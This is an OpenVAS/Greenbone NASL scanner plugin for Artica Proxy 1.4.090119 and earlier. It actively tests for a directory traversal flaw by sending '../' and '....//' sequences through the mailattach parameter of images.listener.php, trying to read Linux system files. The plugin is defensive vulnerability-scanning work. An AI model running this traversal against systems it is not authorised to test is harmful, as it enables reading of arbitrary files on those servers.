# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:articatech:artica_proxy";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100871");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-26 13:33:58 +0200 (Tue, 26 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Artica Proxy <= 1.4.090119 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_artica_proxy_http_detect.nasl");
  script_mandatory_keys("artica/proxy/http/detected");
  script_require_ports("Services/www", 9000);

  script_tag(name:"summary", value:"Artica Proxy is prone to multiple security vulnerabilities
  including directory traversal vulnerabilities, security bypass vulnerabilities, an SQL injection
  (SQLi) issue, and an unspecified cross-site scripting (XSS) issue.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"- Successfully exploiting the directory traversal issues allows
  attackers to view arbitrary local files and directories within the context of the webserver.

  - Attackers can exploit the SQL injection issue to carry out unauthorized actions on the
  underlying database.

  - Successfully exploiting the security bypass issues allows remote attackers to bypass certain
  security restrictions and perform unauthorized actions.

  - Attackers can exploit the cross-site scripting issue to execute arbitrary script code in the
  browser of an unsuspecting user in the context of the affected site. This may let the attacker
  steal cookie-based authentication credentials or launch other attacks.");

  script_tag(name:"affected", value:"Artica Proxy version 1.4.090119 and probably prior.");

  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for
  more information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43613");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

traversal = make_list(crap(data: "../", length: 3 * 10), crap(data: "....//", length: 5 * 6));
files = traversal_files("linux");

foreach trav(traversal) {
  foreach pattern(keys(files)) {
    file = files[pattern];
    url = "/images.listener.php?mailattach=" + trav + file;

    if (http_vuln_check(port: port, url: url, pattern: pattern)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
